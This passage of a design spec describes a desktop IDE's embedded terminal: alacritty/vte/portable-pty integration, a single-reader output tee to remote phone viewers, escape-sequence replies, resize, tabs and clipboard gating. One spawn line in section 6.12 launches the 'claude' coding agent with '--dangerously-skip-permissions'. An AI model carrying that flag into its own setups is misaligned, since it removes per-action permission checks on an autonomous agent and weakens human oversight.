- **Licensing.** Zed's `crates/terminal` and `crates/terminal_view` are **GPL-3.0-or-later**. We read them freely to learn the alacritty integration and the gpui paint sequence, but **no line of their code enters our tree**. Our `terminal` crate depends only on Apache/MIT crates and reimplements the algorithms from the VT100/xterm spec and alacritty's own Apache-2.0 source. Every file in `crates/terminal/` carries a one-line provenance header: `// Clean reimplementation from the VT spec + alacritty_terminal (Apache-2.0). NOT derived from Zed's GPL terminal crates.`
- **We own the PTY master.** This is the win over the dead native desktops, where libghostty owned the master and hid the byte stream. Because portable-pty hands us the master directly, the raw output has exactly one reader — our read loop — and that is the only place the steer tee needs to live.

### 6.1 Dependencies and the licensing-driven crate selection

```toml
# apps/desktop/crates/terminal/Cargo.toml
[dependencies]
alacritty_terminal = "0.26"       # UPSTREAM, Apache-2.0 — Term/Grid/Config ONLY (resolves 0.26.0)
vte                = { version = "0.15", features = ["std", "ansi"] }
                                  # DIRECT dep — the ansi parser + Color/NamedColor/Rgb types (see 6.1.2);
                                  # resolves 0.15.0, the exact version alacritty_terminal 0.26.0 pins;
                                  # "std" is required for StdSyncHandler (§6.4)
portable-pty       = "0.9"        # MIT — owns the PTY master (openpty/spawn/reader/writer) (resolves 0.9.0)
gpui               = { workspace = true }
gpui-component     = { workspace = true }
domain             = { path = "../domain" }
theme              = { path = "../theme" }
flume              = "0.11"       # wake + event channels between the PTY threads and the UI
parking_lot        = "0.12"       # (Mutex helpers; FairMutex itself comes from alacritty_terminal::sync)
log                = "0.4"
```

**6.1.1 Why upstream `alacritty_terminal` 0.26.0, not Zed's fork.** Zed pins a fork at `git=https://github.com/zed-industries/alacritty rev=4c129667…`. That fork exists only to patch the `tty`/`event_loop`/ConPTY/signal-mask internals of alacritty's own PTY driver — code paths **we never call**. We consume alacritty for its emulator only: `Term<L>`, `Grid`, `Config`, `RenderableContent`/`RenderableCursor`, `TermMode`, `Cell`/`Color`/`NamedColor`, and the VT parser (`vte::ansi::Processor`). We deliberately **do not** use `alacritty_terminal::tty` or `alacritty_terminal::event_loop::EventLoop`, because that machinery consumes the raw bytes internally — precisely where our steer tee has to sit. Skipping it lets us take upstream 0.26.0 straight from crates.io (clean Apache-2.0, no git pin, no fork liability).

**6.1.2 vte is a DIRECT dependency, version-matched to alacritty.** `vte` is the crate that owns the ANSI parser (`Processor`, `Handler`, `Attr`) **and** the color types (`Color`, `NamedColor`, `Rgb`). This is exactly how Zed's reference `terminal` crate wires it — vte is a direct dep (`vte.workspace = true`) and the parser + colors are imported straight from it: `use vte::ansi::{Processor, Handler, Attr, Color, NamedColor, Rgb, StdSyncHandler};`. We do the same: declare `vte` directly. (Correction from Spike A, 2026-07-02: `alacritty_terminal 0.26.0` **does** re-export vte — `pub use vte;` at lib.rs:20, with features `["std", "ansi"]` enabled — so `alacritty_terminal::vte::ansi::Processor` is equally available. Both paths resolve to the single `vte 0.15.0` in the tree; the direct dep is a deliberate choice for explicit imports and version visibility, **not a necessity**.) The real discipline is **version-matching the single vte crate**: pin our `vte` to `{ version = "0.15", features = ["std", "ansi"] }` — 0.15.0 is exactly what `alacritty_terminal 0.26.0` itself pins (verified by the spike: `cargo tree -d` shows one `vte 0.15.0` in the whole tree). One vte in the tree means `Term<L>: vte::ansi::Handler` and `processor.advance(&mut term, …)` unify; two copies would give a `Handler` trait of a *different type* and fail to compile. Keep the `Term`/`event`/`Grid`/`RenderableContent` imports from `alacritty_terminal` — those are correct.

**6.1.3 SPIKE FIRST (Phase 4, before any other terminal work).** A throwaway `examples/term_spike.rs` in the `terminal` crate must confirm, against the *actually resolved* 0.26 API, that:
1. `Term::new(config, &dimensions, listener)` exists and takes an `EventListener`.
2. `Term<L>: vte::ansi::Handler` (so it is a valid `Processor::advance` target).
3. `let mut p = Processor::<StdSyncHandler>::new(); p.advance(&mut term, &bytes);` compiles and mutates the grid.
4. `term.renderable_content()` yields `RenderableContent { display_iter, cursor, mode, colors, .. }`.
5. Which `vte` version is pinned (record it in a comment).

If any of these differ from this spec (upstream 0.26 has churned the `Config`/`Dimensions` shape before), Fable resolves the delta *in the spike* and updates this section's snippets before building the real modules. Do not build `element.rs` against an assumed API.

**Spike run (Spike A, 2026-07-02): all five confirmed** against the resolved tree — `alacritty_terminal 0.26.0` + `vte 0.15.0` + `portable-pty 0.9.0` compile and run together; `Term::new`/`Handler`/`renderable_content` are as specced; the `Processor::<StdSyncHandler>` turbofish is **required** (§6.4); the recorded `vte` pin is **0.15.0**. The spike also empirically validated §6.4's no-LF→CRLF-fixup rule (the PTY's `ONLCR` emitted `\r\n` in the raw sink). The deltas it surfaced (own `Dimensions` impl in §6.10, `TextAreaSizeRequest` in §6.6, `Osc52` config in §6.15) are folded into this section's snippets.

### 6.2 Module layout

```
apps/desktop/crates/terminal/src/
├── lib.rs          # crate root, re-exports Terminal, TerminalManager, TabKind
├── pty.rs          # portable-pty master ownership: open, spawn, reader, writer, resize
├── emulator.rs     # alacritty Term + Config + FairMutex + the ZedListener-equivalent event bridge
├── read_loop.rs    # THE STEER TEE — one blocking read thread, software fan-out
├── keys.rs         # reimplemented to_esc_str (~420 lines, key → escape bytes)
├── mouse.rs        # (optional v1) mouse reporting → escape bytes
├── element.rs      # gpui Element: request_layout / prepaint / paint of the grid + cursor + selection
├── tab.rs          # TerminalTab { id, kind, terminal, title, status }
├── manager.rs      # TerminalManager: Vec<TerminalTab> + active index (JetBrains model)
└── steer.rs        # thin glue to the steer publisher (§08): SteerSink trait + wiring
```

`pty.rs`, `emulator.rs`, `read_loop.rs`, `keys.rs`, `mouse.rs` are **gpui-free** and unit-testable in isolation (feed bytes, assert grid/escape output). `element.rs`, `tab.rs`, `manager.rs`, `steer.rs` are the gpui glue.

### 6.3 PTY ownership (`pty.rs`) — we hold the master

```rust
use portable_pty::{native_pty_system, CommandBuilder, PtySize, MasterPty};
use std::sync::{Arc, Mutex};
use std::io::Write;

pub struct Pty {
    master: Box<dyn MasterPty + Send>,
    writer: Arc<Mutex<Box<dyn Write + Send>>>,   // shared: local keys + paste + remote steer input
    child:  Box<dyn portable_pty::Child + Send + Sync>,
    reader: Option<Box<dyn std::io::Read + Send>>, // taken exactly once by read_loop
}

pub fn open(cmd: CommandBuilder, cols: u16, rows: u16) -> anyhow::Result<Pty> {
    let pair = native_pty_system().openpty(PtySize {
        rows, cols, pixel_width: 0, pixel_height: 0,
    })?;
    let child  = pair.slave.spawn_command(cmd)?;   // child inherits the slave as its controlling tty
    let reader = pair.master.try_clone_reader()?;  // ONE reader; never cloned again (see 6.4)
    let writer = pair.master.take_writer()?;
    drop(pair.slave);                              // MUST drop: else the reader never hits EOF on child exit
    Ok(Pty {
        master: pair.master,
        writer: Arc::new(Mutex::new(writer)),
        child,
        reader: Some(reader),
    })
}

impl Pty {
    pub fn take_reader(&mut self) -> Box<dyn std::io::Read + Send> {
        self.reader.take().expect("reader taken twice")
    }
    pub fn writer(&self) -> Arc<Mutex<Box<dyn Write + Send>>> { self.writer.clone() }
    pub fn resize(&self, cols: u16, rows: u16) -> anyhow::Result<()> {
        self.master.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 })?;
        Ok(())
    }
    pub fn writer_write(&self, bytes: &[u8]) {
        if let Ok(mut w) = self.writer.lock() { let _ = w.write_all(bytes); let _ = w.flush(); }
    }
}
```

Load-bearing details:
- **`drop(pair.slave)` after spawn is mandatory.** As long as any process (including us) holds the slave open, the master's reader never sees EOF, so on child exit our read loop would block forever and the tab's play→stop flip + the `coding_sessions` row end (§6.7) would never fire.
- **One shared `Arc<Mutex<writer>>`.** Local keystrokes, bracketed paste, remote steer input, *and* terminal-event replies (device-attribute/DSR answers, §6.6) all funnel through this one writer. The child cannot tell remote steer input from local typing — that is exactly the point (§08's inject path is "write these bytes to the writer").
- **`pixel_width/pixel_height = 0`.** We report character cells only; TUIs that want pixel geometry (sixel) are out of scope for v1.

### 6.4 The steer tee (`read_loop.rs`) — the one raw-output tap

This module is **greenfield** — there is no Zed analog, because Zed's alacritty event loop keeps the byte stream private. Our design mirrors the *shape* of Zed's headless `spawn_task_subprocess` (terminal.rs:2974 — read chunk → `processor.advance(&mut term)` under the lock → send a `Wakeup`), but as a first-class always-on path with an added software fan-out to the steer publisher.

```rust
use vte::ansi::{Processor, StdSyncHandler};
use alacritty_terminal::sync::FairMutex;
use std::io::Read;
use std::sync::Arc;

/// Anything that wants the raw child bytes besides the emulator (the steer publisher, §08).
pub trait RawSink: Send { fn on_output(&self, chunk: &[u8]); }

pub fn spawn_read_loop(
    mut reader: Box<dyn Read + Send>,
    term: Arc<FairMutex<Term<EventProxy>>>,
    sink: Option<Arc<dyn RawSink>>,   // the steer publisher; None until a room is claimed
    wake: flume::Sender<Wake>,        // drained on the gpui thread
) -> std::thread::JoinHandle<()> {
    std::thread::Builder::new().name("pty-read".into()).spawn(move || {
        // Turbofish REQUIRED: the `T: Timeout = StdSyncHandler` default type param does not
        // participate in fn-call inference — bare `Processor::new()` fails E0283. StdSyncHandler
        // is imported from vte::ansi (needs vte's "std" feature, §6.1).
        let mut processor = Processor::<StdSyncHandler>::new(); // owns the vte parse state across chunks
        let mut buf = [0u8; 8192];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,                 // EOF: child exited (slave was dropped, 6.3)
                Err(e) => { log::warn!("pty read: {e}"); break; }
                Ok(n) => {
                    let chunk = &buf[..n];
                    // (a) fan out to the steer publisher FIRST (cheap, non-blocking send)
                    if let Some(s) = &sink { s.on_output(chunk); }
                    // (b) feed the emulator under the Term lock — hold it ONLY here
                    {
                        let mut t = term.lock();
                        processor.advance(&mut *t, chunk);
                    }
                    // (c) wake the gpui view to repaint
                    let _ = wake.try_send(Wake::Output);
                }
            }
        }
        let _ = wake.try_send(Wake::Eof);
    }).expect("spawn pty-read")
}
```

Rules baked into this loop:
- **Exactly one blocking reader.** Never `try_clone_reader()` a second time to get a "steer copy." Two concurrent blocking reads on the same master race and split the stream — half the bytes go to the emulator, half to steer, and both corrupt. The fan-out is done in **software**, inside this one thread, after the single `read()`.
- **Order: sink before emulator.** The steer publisher gets the chunk as-is; then we take the `FairMutex` and advance the parser. The lock is held *only* around `processor.advance` — never across the `read()` (would deadlock the paint thread) and never across the sink send.
- **No `\n`→`\r\n` fixup.** Zed's `convert_lf_to_crlf` (terminal.rs:2939) exists solely for its *headless piped-subprocess* path, where output comes from a raw pipe with no line discipline. **We always spawn through a PTY**, whose `ONLCR` line discipline already turns `\n` into `\r\n`. Applying the fixup on PTY output would double the carriage returns. So: skip it. (If a future run-config ever runs a program with stdout redirected to a pipe rather than the PTY, that is a separate code path, not this one.)
- **`Processor` is stateful across chunks.** A single escape sequence can straddle a `read()` boundary; the one long-lived `Processor` carries the partial-parse state, so we must not recreate it per chunk. Construct it with the `Processor::<StdSyncHandler>::new()` turbofish — the default type param doesn't infer at call sites (E0283), and `StdSyncHandler` comes from `vte::ansi` behind the `"std"` feature.
- **`Wake` channel, not direct notify.** The read thread is a plain `std::thread` and cannot touch gpui entities (they are `!Send`). It sends `Wake::Output`/`Wake::Eof` on a `flume` channel; a single foreground `cx.spawn` task drains it and calls `entity.update(cx, |_, cx| cx.notify())` (see §03 threading). Coalesce bursts: if several `Wake::Output` are queued, one `notify()` suffices.

### 6.5 Input, paste, and remote steer input — one writer, no special cases

All three input sources write to the shared `Arc<Mutex<writer>>`:

- **Local keystrokes.** The gpui `Terminal` view's key handler calls `keys::to_esc_str(&keystroke, mode, opt_as_meta)` (§6.8) and writes the returned bytes.
- **Paste.** When `mode.contains(TermMode::BRACKETED_PASTE)`, wrap the pasted text in `\e[200~` … `\e[201~`; otherwise write it raw. (Bracketed paste stops a shell from interpreting pasted newlines as command submits and lets editors/`claude` treat the block as literal input.)
- **Remote steer input (§08).** The steer publisher, on an `input` frame from a phone, calls `pty.writer_write(bytes)`. The child sees it identically to local typing. The **only** gate is the steer ticket/permission check, enforced in the `steer` crate before the bytes ever reach here (`packages/steer-ticket` + `lib/steer.ts` claims) — the terminal layer itself does zero auth.

Because remote input is just "more bytes to the writer," there is no branching in the child, the emulator, or the writer. This is the whole reason we own the master.

### 6.6 Terminal events — replies MUST go back to the PTY (or `claude` hangs)

`Term::new` requires an `EventListener`. alacritty emits `AlacTermEvent`s for things the emulator can't answer itself — and several of them are **requests that demand a written reply**. Our listener is a tiny `Send` proxy that forwards every event onto a `flume` channel drained on the gpui thread:

```rust
use alacritty_terminal::event::{Event as AlacTermEvent, EventListener};

#[derive(Clone)]
pub struct EventProxy(pub flume::Sender<AlacTermEvent>);
impl EventListener for EventProxy {
    fn send_event(&self, event: AlacTermEvent) { let _ = self.0.send(event); }
}
```

(Upstream `EventListener::send_event` has a default no-op body, so the minimal
legal listener is `impl EventListener for X {}` — handy for tests. Production
always forwards via this `EventProxy`, because dropping the reply-required
events below hangs TUIs.)

The foreground drain handles each variant (mirroring Zed terminal.rs:1531-1607, reimplemented):

| `AlacTermEvent` | Action |
|---|---|
| `PtyWrite(text)` | **write `text` to the shared writer.** This is how device-attribute (DA1/DA2), DSR/cursor-position, and other query replies get back to the child. |
| `ColorRequest(index, formatter)` | look up `term.colors()[index]`, format via the closure, **write the reply to the writer.** |
| `TextAreaSizeRequest(formatter)` | same reply-required family as `ColorRequest` (`Arc<dyn Fn(WindowSize) -> String>`): format the current text-area `WindowSize` via the closure and **write the reply to the writer** — drop it and a querying TUI can hang, exactly like the DA/DSR case below. |
| `ClipboardLoad(_)` / `ClipboardStore(_)` | **gated/disabled by default** — OSC-52. See §6.11 security. Do not blindly write clipboard contents to the child or the system clipboard. |
| `Title(s)` / `ResetTitle` | update the tab title (§6.9). |
| `Bell` | optional subtle visual bell; no audio in v1. |
| `Wakeup` | request a repaint (`cx.notify()`). |
| `ChildExit(status)` / `Exit` | end-of-session path: flip the tab play→stop and **emit the exit event up the flume channel** — the `terminal` crate does **not** call tRPC (it has no `api` dep). §07's launcher (which owns the api client) ends the `coding_sessions` row on receiving this signal (§6.7). |

**Why this is load-bearing and easy to miss:** a plain interactive shell almost never issues DA/DSR queries, so a naïve terminal that drops `PtyWrite` replies *looks fine in a smoke test*. But full-screen TUIs — `vim`, and specifically the **`claude` TUI** — probe the terminal at startup (primary/secondary device attributes, cursor-position report) and **block waiting for the answer**. Drop the reply and `claude` hangs on a blank screen. The Phase-4 gate explicitly requires the `claude` TUI to render, precisely to catch a missing reply path.

### 6.7 Child lifecycle → `coding_sessions` row

Each terminal owns its `portable_pty::Child`. A dedicated `std::thread` calls `child.wait()` (blocking) and, on return, sends the `ExitStatus` up the wake channel. The foreground handler then:
1. flips the tab `status` from `Running`→`Exited(code)` and the run-bar play→stop (§07);
2. **emits an exit signal** (`Wake::Eof` / a `ChildExit` event) up the flume channel for the `coding` crate to act on.

**The terminal crate SIGNALS exit; it never ends the `coding_sessions` row itself.** The row is created by §07's launcher (`codingSessions.start`) and ended by §07's launcher (`codingSessions.end`, §7.1 step 8) — the launcher owns the `api`/tRPC client; the `terminal` crate depends only on `domain` + `theme` (§6.1) and has **no way to call tRPC**. This crate's only job at exit is to raise the signal (fired on **either** `child.wait()` returning **or** the read loop hitting EOF (`Wake::Eof`), whichever comes first). §07 makes its `codingSessions.end` call **idempotent** (fire once per tab; the server no-ops an already-ended session). EOF and `wait()` normally coincide (we dropped the slave), but a child that double-forks could close the PTY before the tracked pid exits, so we surface both edges and §07 dedupes.

### 6.8 Keys, mouse, and color — reimplemented from the spec (not from Zed)

**`keys.rs` — `to_esc_str` (~420 lines).** This is the single largest hand-written table and the one with the sharpest licensing edge: Zed's `crates/terminal/src/mappings/keys.rs` is GPL. We **do not** read-and-translate it. We reimplement `fn to_esc_str(keystroke: &Keystroke, mode: TermMode, alt_is_meta: bool) -> Option<Cow<'static, [u8]>>` from the **VT100/xterm control-sequence spec** and **alacritty's own Apache-2.0 `src/input.rs`/bindings**. Coverage:
- printable chars → UTF-8 bytes (with Alt/Option-as-Meta prefixing `\e` when `alt_is_meta`);
- Enter/Tab/Backspace/Esc, Ctrl-letter → C0 control bytes;
- arrows/Home/End/PgUp/PgDn/Insert/Delete/F1–F20, honoring **`TermMode::APP_CURSOR`** (`\e[A` vs `\eOA`) and **`APP_KEYPAD`**;
- modifier-combination CSI parameters (`\e[1;5C` for Ctrl-Right, etc.).

A `keys.rs` unit test asserts a fixed matrix of (key, mode) → bytes against the xterm reference, so regressions surface without a live terminal. The file header records provenance (spec + alacritty Apache, explicitly *not* Zed GPL).

**`mouse.rs` (optional in v1).** SGR mouse reporting (`\e[<b;x;yM/m`) gated on `TermMode::SGR_MOUSE`/`MOUSE_REPORT_CLICK`/`MOUSE_DRAG`. `claude` and shells don't need mouse; `vim`/`htop` benefit. Ship v1 without it if schedule-pressed (selection/scroll still work locally); add behind the same clean-reimpl rule. Mark as an **Open question:** whether v1 includes mouse reporting or defers it to a follow-up.

**Color conversion (`element.rs::convert_color`).** Map the cell color → a gpui `Hsla` from the Exponential palette (§04 theme). The color enum + `NamedColor`/`Rgb` types come from **`vte::ansi`** (`use vte::ansi::{Color, NamedColor, Rgb};`), not from `alacritty_terminal` (which re-uses vte's types via the `Handler` it implements):
- `Color::Named(NamedColor)` → the theme's `terminal_ansi_*` token (black/red/green/yellow/blue/magenta/cyan/white + their bright variants, plus foreground/background/cursor). These 16+ tokens live in the `theme` crate, derived from the design-tokens (§04), so the terminal matches the app chrome.
- `Color::Spec(Rgb)` → truecolor straight through (`rgb.r/g/b` → `Rgba`).
- `Color::Indexed(i)` → for `i < 16` use the named table; for `16..232` decode the 6×6×6 cube; for `232..256` the 24-step grayscale ramp. Standard xterm-256 math, reimplemented.

### 6.9 The gpui grid `Element` (`element.rs`)

The grid is a **low-level gpui `Element`** (not a composed `div()` tree) with the three-phase `request_layout → prepaint → paint` lifecycle, doing all its own painting — mirroring the *approach* of Zed's `terminal_element.rs` (studied, GPL, reimplemented). Roughly **1.2–1.5k LOC** for a clean v1.

**Cell metrics.** In `prepaint`, compute from the window text system (Zed does the same, terminal_element.rs:1009):
```rust
let font_id     = text_system.resolve_font(&font);
let cell_width  = text_system.advance(font_id, font_pixels, 'm').width; // monospace advance
let line_height = font_pixels * theme.terminal_line_height;             // e.g. 1.3
let cols = (bounds.size.width  / cell_width ).floor().max(1.0) as usize;
let rows = (bounds.size.height / line_height).floor().max(1.0) as usize;
```
**Device-pixel snapping.** Origins and the row count must be snapped to device pixels or the bottom row flickers/disappears under f32 loss. Follow alacritty/Zed's trick (`raw.next_up().floor()`, terminal.rs:766) for the snapped column/row count, and `.floor()` cell origins at paint (terminal_element.rs:205,555). Never let a cell origin land at a fractional device pixel.

**`layout_grid` → batched draws.** Iterate `term.renderable_content()`'s cell iterator once and produce two coalesced draw lists:
- **`BackgroundRegions`** — merge horizontally-adjacent cells sharing a bg color into one `window.paint_quad(fill(bounds, color))` (terminal_element.rs:215). Far fewer quads than one-per-cell.
- **`BatchedTextRuns`** — group runs of same-style (fg/bold/italic/underline) cells and lay each out with **`text_system.shape_line(text, font_size, &runs, Some(cell_width))`** — the `Some(cell_width)` **forces the monospace advance** so glyphs land on exact cell boundaries (terminal_element.rs:166). Without the forced advance, proportional-width glyphs drift and the grid smears.

**Cursor.** Read `renderable_content().cursor`; paint block/bar/underline per `CursorShape` at `(col*cell_width, line*line_height)` (floored). Hollow the block when the window is unfocused. The cursor cell's glyph is repainted in the inverted color for the block shape.

**Selection.** Local mouse selection paints a `HighlightedRange` (reimplemented, terminal_element.rs:148) — a rounded multi-line band behind the selected cells. Selection→clipboard copy is local only (not OSC-52).

**Wide/CJK/emoji/combining — special-case or the grid smears.** alacritty marks the trailing cell of a double-width glyph with `Flags::WIDE_CHAR_SPACER`; a combining/zero-width mark rides on the base cell. The layout must:
- skip spacer cells (don't emit a glyph or advance twice for them);
- advance **two** cell widths for a `WIDE_CHAR` (CJK, most emoji);
- fold zero-width/combining codepoints onto the preceding base cell rather than giving them their own cell.
The Phase-4 gate includes a CJK+emoji sample specifically to verify no smear/overlap.

**Layout of the dock panel.** The terminal lives in the bottom `Dock` (§03). Guard the layout against a **0-height** docked panel (collapsed dock): if `rows == 0`, skip the PTY resize and paint nothing rather than resizing to a zero grid (which alacritty rejects and which would thrash the child with SIGWINCH).

### 6.10 Resize / SIGWINCH

On every layout where the integer `(cols, rows)` changes (debounced — ignore pixel-level jitter while dragging, exactly Zed's `requires_resize` guard at terminal.rs:1943, comparing `num_lines()`/`num_cols()` not pixels):
1. `pty.resize(cols, rows)` — this is the **SIGWINCH** to the child (portable-pty's `MasterPty::resize` issues `TIOCSWINSZ`), so `claude`/`vim` reflow;
2. `emulator.resize(cols, rows)` — `Term::resize` is generic (`fn resize<S: Dimensions>(&mut self, size: S)`, taking any impl of `alacritty_terminal::grid::Dimensions`); there is **no ready-made production size type** — the only stock impl, `TermSize`, lives in `alacritty_terminal::term::test` (a test-helpers module) — so `emulator.rs` defines its **own ~12-line `Dimensions` struct** (e.g. `GridSize { columns, screen_lines, total_lines }`) and passes it to reshape the grid and reflow scrollback;
3. emit a **relay `resize` frame** (§08) so remote phone viewers reshape their mirror.

All three must fire together and only on an integer-cell change. Debounce is essential: dragging a window edge fires dozens of pixel-granular layouts per second; resizing the PTY that often floods the child with SIGWINCH and stutters TUIs.

### 6.11 Threading model (recap, terminal-specific)

Three blocking operations, three dedicated `std::thread`s per terminal — **never** on gpui's async executors (which are for `!Send`/cooperative work):
- **read thread** (`read_loop.rs`) — blocking `reader.read()` → software tee → wake;
- **wait thread** — blocking `child.wait()` → exit status → wake;
- the **writer** is synchronous and called inline from the foreground (key handler / paste / steer inject / event replies), guarded by its own `Mutex`; writes are tiny and non-blocking in practice.

Bridge to gpui via the `flume` wake/event channels drained by one foreground `cx.spawn`. The `Term` `FairMutex` is contended only between the read thread (advance) and the paint (`renderable_content`) — held briefly on both sides; `FairMutex` prevents the read thread from starving paint under heavy output (e.g. `yes` or a huge `cat`).

### 6.12 Spawning `claude` and the PATH-augmentation fix (EXP-2b / EXP-4 / EXP-5)

```rust
let mut cmd = CommandBuilder::new("claude");
cmd.args(["--model", &settings.claude_model, "--dangerously-skip-permissions", &seed_prompt]); // model explicit-always (§7.7); seed prompt as POSITIONAL argv
cmd.cwd(&worktree_path);
cmd.env("TERM", "xterm-256color");
cmd.env("COLORTERM", "truecolor");
cmd.env("PATH", augmented_path());   // see below — THE critical fix
// .mcp.json + PROMPT.md are written by the `coding` crate (§07) before this spawn
```
- **Seed prompt as positional argv.** The plan-first prompt is passed as `claude`'s positional argument — atomic, no race. The "write the prompt to the PTY after a startup marker" handshake is kept only as a documented **fallback** if a future `claude` version stops accepting a positional prompt.
- **`TERM=xterm-256color`, `COLORTERM=truecolor`** so `claude` renders full color and the correct capability set into our emulator.

**PATH augmentation (critical, and the cause of EXP-4/EXP-5 "claude/git not found").** A macOS `.app` (and a Linux `.desktop`/AppImage) launches with a **minimal PATH** (`/usr/bin:/bin:/usr/sbin:/sbin`) that does **not** include Homebrew, npm-global, or `~/.claude/local`. Bare `CommandBuilder::new("claude")` then fails to resolve, and Start-coding falsely reports "not installed." Fix, in the `terminal`/`coding` crate startup:

```rust
// Resolve the user's REAL interactive PATH once, cache it for the process lifetime.
fn resolve_login_path() -> String {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".into());
    let out = std::process::Command::new(&shell)
        .args(["-lic", "printf %s \"$PATH\""])   // login+interactive so rc files run
        .output().ok();
    let base = out.and_then(|o| String::from_utf8(o.stdout).ok())
                  .filter(|s| !s.trim().is_empty())
                  .unwrap_or_else(|| std::env::var("PATH").unwrap_or_default());
    // Prepend the usual tool dirs defensively (some setups don't export via rc).
    let prepend = [
        "/opt/homebrew/bin", "/usr/local/bin",
        &format!("{home}/.local/bin"),
        &format!("{home}/.claude/local"),
        &npm_global_bin(),   // `npm config get prefix`/bin, cached
    ];
    dedup_prepend(prepend, base)
}
```
Cache the result and reuse it for the `claude`, run-config, and shell spawns. The **onboarding doctor (§07)** runs *after* augmentation and verifies `claude` and `git` actually resolve on the augmented PATH, surfacing an actionable error (with the resolved PATH) instead of a silent Start-coding failure — this is the concrete fix for EXP-4's "desktop said 'github not connected' / claude blocked" and EXP-5's fresh-Ubuntu breakage.

### 6.13 Multi-tab terminal (JetBrains model, EXP-2e)

`TerminalManager` owns the tab strip in the bottom dock and is the run-bar's counterpart (§07 owns the run-config dropdown + play/stop button; the manager owns the tabs those actions create).

```rust
pub enum TabKind {
    Claude,                 // a Start-coding session (one per coding session)
    Run(RunConfigId),       // a launched DB run-config (§07)
    Shell,                  // a plain "+" terminal, like any IDE
}
pub struct TerminalTab {
    pub id: TabId,
    pub kind: TabKind,
    pub terminal: Entity<Terminal>,
    pub title: SharedString,     // updated by AlacTermEvent::Title / kind default
    pub status: TabStatus,       // Running | Exited(i32)
}
pub struct TerminalManager {
    pub tabs: Vec<TerminalTab>,
    pub active: usize,
}
```

Rendering uses **gpui-component**'s `Tab`/`TabBar` inside the `dock` system's bottom `Panel` (a `TabPanel`) — **not** Zed's GPL `Pane`/`PaneGroup`/`Dock`/`terminal_panel.rs`. Behavior:
- **"+"** → a `Shell` tab: spawn the user's `$SHELL -l` in the worktree cwd (or `$HOME` if no repo context).
- **`Claude`** → created by the Start-coding launcher (§07): one per coding session, titled `claude · EXP-123`.
- **`Run(id)`** → created when the run-bar play button launches a run-config (§07): spawn the config's stored **argv directly** (`program = argv[0]`, `args = argv[1..]`) through the §7.4 `SpawnSpec` in the configured cwd — **never** via a shell (`$SHELL -lc "<command>"` would reintroduce shell parsing/injection of the command string and reverse the §7.3.5 Trust-&-Run security posture, which assumes no shell interpretation; it also wouldn't match the `argv: string[]` schema). Titled with the run-config name; play↔stop is bound to this tab's child lifecycle (§6.7 flips it on exit, captured exit code shown). Only the `Claude` and `Shell` tabs run under a login shell; `Run` is argv-direct.
- add / close / switch, keyboard-navigable; closing a tab kills its child (`Child::kill`) and joins its threads.

**Persistence (per-window `DockAreaState`, §03):** persist only `{ kind, cwd, run_config_id }` per tab — **never scrollback** (privacy + size). On restore, re-open the tabs but do **not** auto-respawn `claude` sessions (a coding session is bound to a live worktree/branch; §07 decides whether it is resumable) — restore `Shell` tabs cold and leave exited `Run` tabs closed.

### 6.14 The `steer.rs` seam

`terminal` exposes a `RawSink` trait (§6.4) and a setter to attach/detach a publisher; it knows nothing about WebSockets, tickets, or frame formats. The `steer` crate (§08) implements `RawSink` (each `on_output(chunk)` becomes a `0x01` output frame to the relay), calls `pty.writer_write(bytes)` for inbound `input` frames (after its own ticket/permission gate), and calls `pty.resize()` + emits a resize frame on remote resize. The interface between the two crates is exactly: **`RawSink::on_output` (out), `Pty::writer_write` (in), `Pty::resize` (resize)** — everything else (rooms, presence, claims, kill, replay, reconnect, wire protocol) lives in §08 and the frozen `apps/steer-relay` protocol.

### 6.15 Security

- **OSC-52 clipboard is disabled/gated by default — at BOTH levels.** Upstream 0.26's `Config` has an `osc52: Osc52` field (`Disabled` / `OnlyCopy` [default] / `OnlyPaste` / `CopyPaste`): set **`Osc52::Disabled`** on the emulator `Config` so OSC-52 is suppressed at the emulator itself, **in addition to** ignoring `AlacTermEvent::ClipboardStore` (child asks to *set* the system clipboard) and `ClipboardLoad` (child asks to *read* it) in the event drain. Both forward app-controlled data across the local clipboard boundary; leave both off in v1 (or behind an explicit per-terminal opt-in), independent of the local select-to-copy path which is fully client-side.
- **Remote steer input is gated upstream.** Injection into the writer is only reachable through the `steer` crate, which enforces the server-minted steer ticket + permission (`packages/steer-ticket`, `lib/steer.ts`) before calling `writer_write`. The terminal layer performs no auth and must never be wired to accept raw network bytes directly.
- **Token-embedded remotes never touch the terminal.** The `coding` crate (§07) builds the token-embedded git remote and writes `.mcp.json`; those secrets are not passed through the terminal's env dump or logged. The terminal only spawns `claude` with the augmented PATH and the safe env above.

### 6.16 Phase-4 gate (definition of done)

The terminal is done when, on real hardware:
1. an **interactive shell** runs, echoes, and handles Ctrl-C/job control;
2. **`vim`** enters/exits full-screen alt-buffer cleanly and reflows on resize;
3. the **`claude` TUI renders** (proving DA/DSR `PtyWrite` replies are forwarded — §6.6) and **resizes correctly** (SIGWINCH + `term.resize`, §6.10);
4. a **CJK + emoji** sample renders without smear/overlap (§6.9 wide-char handling);
5. **multi-tab add / close / switch** works (Shell/Claude/Run kinds, §6.13);
6. a **run-config play/stop** flips with the captured **exit code** (§6.7 + §07);
7. **child exit ends the `coding_sessions` row** `running`→`ended` (§6.7);
8. the **read-loop tee simultaneously feeds the emulator AND a stub `RawSink`** consumer (the §08 publisher is stubbed at this phase) — proving the single-reader software fan-out (§6.4).


---

## 7. IDE features (Start-coding launcher, hidden key, DB run configs, play/stop, multi-window, diff, doctor)

This section specifies everything the desktop app does *beyond* being a pixel-parity issue tracker — the IDE layer that makes Exponential "clone → AI → PR from anywhere." It owns the `coding` crate (the Start-coding launcher), the hidden auto-minted personal key path in the `api` crate, the one new server addition (`run_configs` + the `runConfigs` tRPC router), the JetBrains-style run bar + play/stop wiring on top of the `terminal` crate's `TerminalManager` (§06), multi-window session isolation, the read-only side-by-side PR diff via gpui-component's `highlighter`, and the settings + tooling-doctor onboarding pane. It closes EXP-2 (a/b/c/d/e/f), EXP-4 (never falsely block Start coding, correct GitHub state), and EXP-1 #9 (drop the dead Google Calendar integrations panel).

Two interfaces are deferred to their owning sections and must not be re-specified here: the terminal tab lifecycle / PTY ownership / grid element lives in **§06 (embedded terminal)**, and the relay tee/inject/presence wire protocol lives in **§08 (remote steer publisher)**. This section calls those interfaces and states its side of the contract.

